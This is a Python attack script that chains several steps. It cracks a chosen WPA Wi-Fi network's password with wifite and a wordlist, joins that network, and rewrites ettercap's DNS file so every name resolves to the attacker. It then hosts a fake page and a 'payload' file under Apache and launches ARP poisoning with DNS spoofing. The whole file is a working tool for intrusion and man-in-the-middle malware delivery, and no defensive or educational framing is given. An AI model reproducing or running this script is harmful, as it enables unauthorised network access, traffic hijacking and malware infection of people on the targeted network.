import os
import subprocess
import sys

INTERFACE_NAME = "wlan0"
WIFITE_PASSWORDS_FILE = "cracked.txt"
DICT_FILE = "dict.txt"

def setup():
    os.system("rm *.cap")
    os.system("rm {}".format(WIFITE_PASSWORDS_FILE))
    os.system("sudo rfkill unblock wifi; sudo rfkill unblock all") # unblock network card before stopping

def crackWPA(essid, dictFile):
    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--wpa", "--dict", dictFile]).wait()
    with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
        for line in passwords.readlines():
            if '"key":' in line:
                print(line.split()[-1][1:-2])
                return line.split()[-1][1:-2]

def connectToNetwork():
    os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
    os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
    os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
    

def getMachineIPAddress():
    cmd = "hostname -I | awk \'{print $1}\'"
    ip_addr = str(os.popen(cmd).read()).strip('\n')
    return ip_addr

def ettercapConfiguration(ip_address):
    with open("/etc/ettercap/etter.dns", "a") as etter:
        etter.write("* A {}\n".format(ip_address))
        etter.write("* PTR {}".format(ip_address))

def startApache():
    os.system("cp index.html /var/www/html/")
    os.system("cp wifi.png /var/www/html/")
    os.system("cp payload /var/www/html/")
    os.system("cp connect.png /var/www/html/")
    os.system("apache2ctl start")

def startDNSSpoofing():
    os.system("ettercap -i eth0 -T -q -P dns_spoof -M ARP:remote")

if __name__ == "__main__":
    setup()
    essid = input("Enter the name of the network you'd like to attack:")
    password = crackWPA(essid, DICT_FILE)
    connectToNetwork()
    # password = "praetorian"
    input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
    print("ARP Poisoning and redirecting...")

    # ettercap
    ip = getMachineIPAddress()
    ettercapConfiguration(ip)
    # ettercap
    startApache()
    startDNSSpoofing()

